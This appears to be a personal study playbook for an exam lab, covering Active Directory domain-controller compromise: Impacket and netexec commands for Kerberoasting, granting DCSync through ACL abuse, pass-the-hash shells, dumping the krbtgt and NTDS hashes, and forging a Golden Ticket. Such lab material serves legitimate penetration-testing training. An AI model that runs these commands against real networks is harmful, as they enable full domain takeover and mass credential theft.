# 🖥️ DC01 — Domain Controller

> Machine command playbook for **DC01**, the domain endgame. Steps mirror your Landscape checklist (11 tasks). **Nothing pre-filled** — replace every `<…>` with verified values; paste real output/screenshots where marked. Never record a guessed value.

Part of [[Active Directory]]. Attack path: [[MS01 — Initial Foothold|MS01]] → [[MS02 — Lateral Movement|MS02]] → **DC01** · overview: [[AD Attack Path — MS01 to DC01]].

---

## 🎯 VERIFIED ENVIRONMENT (fill from your lab)
| Field | Value |
|---|---|
| IP | `<DC_IP>` |
| Hostname | `<DC_HOST>` |
| Domain (FQDN) | `<DOMAIN>` |
| Priv cred used | `<user>:<pass>` / `<user>:<NThash>` |
| krbtgt hash | `<from DCSync>` |
| Domain SID | `<from secretsdump / lookupsid>` |
| proof.txt | `<flag>` |

```bash
export DC=<DC_IP> DOMAIN=<domain.tld> U=<priv_user> P='<pass>' H='<NThash>'
echo "$DC <DC_HOST>.$DOMAIN $DOMAIN" | sudo tee -a /etc/hosts ; sudo ntpdate $DC
```
> Carry in from [[MS02 — Lateral Movement]]: the highest-priv cred/hash (step 11) and BloodHound path (13).

---

## 🔎 RECON

### 1. Confirm DC via LDAP/Kerberos (88, 389, 445) — `Recon`
```bash
sudo nmap -sC -sV -p88,389,445,636,3268 <DC_IP> -oN nmap/dc-tcp.txt
```
```bash
netexec smb <DC_IP>
```
- **Look for:** 88+389+445 confirm the KDC/DC; `netexec` prints the DC hostname + domain.
- `# ← paste confirmation` · `![[dc-01-confirm.png]]`

### 2. Map high-priv creds from MS01/MS02 — `Recon`
- List every cred/hash harvested so far and **which principal** each is; identify the most privileged (DA, or one with DCSync).
- `# ← table: principal → cred/hash → privilege` · `![[dc-02-credmap.png]]`

---

## 🔍 ENUM

### 3. Check DCSync rights on owned principals — `Enum`
```bash
netexec ldap <DC_IP> -u $U -p $P -M daclread -o TARGET_DN="<BASE_DN>" ACTION=read
```
- **Look for:** an owned principal holding `GetChanges`+`GetChangesAll` → straight to step 8 ([[DCSync & Domain Dominance]]). BloodHound's *DCSync* edge shows this too.
- `# ← record who has DCSync` · `![[dc-03-dcsync-rights.png]]`

### 4. Enumerate GPOs, ACLs, delegation — `Enum`
```bash
netexec ldap <DC_IP> -u $U -p $P --bloodhound -c all -ns <DC_IP>    # or SharpHound
```
- **Look for:** `WriteDACL`/`GenericAll` over the domain object, writable GPOs, delegation → [[AD ACL Abuse]].
- `# ← record exploitable ACL edges` · `![[dc-04-acls.png]]`

---

## 🗡️ ATTACK

### 5. Kerberoast / AS-REP roast domain accounts — `Attack`
```bash
impacket-GetUserSPNs $DOMAIN/$U:'$P' -dc-ip <DC_IP> -request -outputfile loot/dc-kerb.txt
```
```bash
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -no-pass -dc-ip <DC_IP> -format hashcat -outputfile loot/dc-asrep.txt
```
- **Does:** last chance to crack a privileged service/user account ([[Kerberoasting]] / [[AS-REP Roasting]]).
- `# ← paste any new crack` · `![[dc-05-roast.png]]`

### 6. Abuse ACL (GenericAll / WriteDACL / AddMember) — `Attack`
```bash
# grant yourself DCSync via WriteDACL (then step 8):
impacket-dacledit -action write -rights DCSync -principal $U -target-dn "<BASE_DN>" $DOMAIN/$U:'$P'
```
```bash
# or add self to a privileged group via AddMember:
bloodyAD -u $U -p $P -d $DOMAIN --host <DC_IP> add groupMember "<Group>" $U
```
- **Does:** convert an ACL edge into DA-equivalent control ([[AD ACL Abuse]]).
- `# ← record edge abused + result` · `![[dc-06-acl-abuse.png]]`

---

## 🚪 ACCESS

### 7. Authenticate to DC01 with DA/priv creds — `Access`
```bash
evil-winrm -i <DC_IP> -u <priv_user> -H <NThash>
```
```bash
impacket-psexec $DOMAIN/<priv_user>@<DC_IP> -hashes :<NThash>     # SYSTEM on the DC
```
- `# ← record shell on DC` · `![[dc-07-shell.png]]`

---

## 🔑 CREDS

### 8. DCSync administrator / krbtgt — `Creds`
```bash
impacket-secretsdump $DOMAIN/$U:'$P'@<DC_IP> -just-dc-user Administrator
```
```bash
impacket-secretsdump $DOMAIN/$U:'$P'@<DC_IP> -just-dc-user krbtgt
```
- **Does:** pull the **Administrator NT hash** (→ PtH the DC) and **krbtgt** (→ Golden Ticket). See [[DCSync & Domain Dominance]].
- `# ← paste admin + krbtgt hashes (loot)` · `![[dc-08-dcsync.png]]`

### 9. Dump NTDS.dit for full domain hashes — `Creds`
```bash
impacket-secretsdump $DOMAIN/$U:'$P'@<DC_IP> -just-dc            # or netexec --ntds
```
- **Look for:** every domain account's hash → reuse across the whole range ([[Credential Reuse]]).
- `# ← record NTDS dump path (loot)` · `![[dc-09-ntds.png]]`

---

## 🏰 AD

### 10. Golden Ticket for persistence (optional) — `AD`
```bash
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <DOMAIN_SID> -domain $DOMAIN Administrator
export KRB5CCNAME=Administrator.ccache ; impacket-psexec -k -no-pass $DOMAIN/Administrator@<DC_HOST>.$DOMAIN
```
- **Does:** forge a TGT for any user — exam persistence / cross-host access. Needs krbtgt hash (step 8) + domain SID.
- `# ← note SID + ticket created` · `![[dc-10-golden.png]]`

---

## 🏁 PROOF

### 11. Grab proof.txt on DC01 — `Proof`
```cmd
type C:\Users\Administrator\Desktop\proof.txt
```
- Screenshot flag + target IP (`ipconfig`) + `whoami` showing `administrator`/SYSTEM ([[Exam Workflow]]).
- `# ← record flag` · `![[dc-11-proof.png]]`

---

## ✅ DOMAIN OWNED
With DC01's NTDS + krbtgt, the domain is yours. Sweep every host with the recovered hashes ([[Credential Reuse]]), confirm **all** proofs (MS01/MS02/DC01) are captured and submitted, and track changes for [[Post-Engagement Cleanup]]. Overview: [[AD Attack Path — MS01 to DC01]].
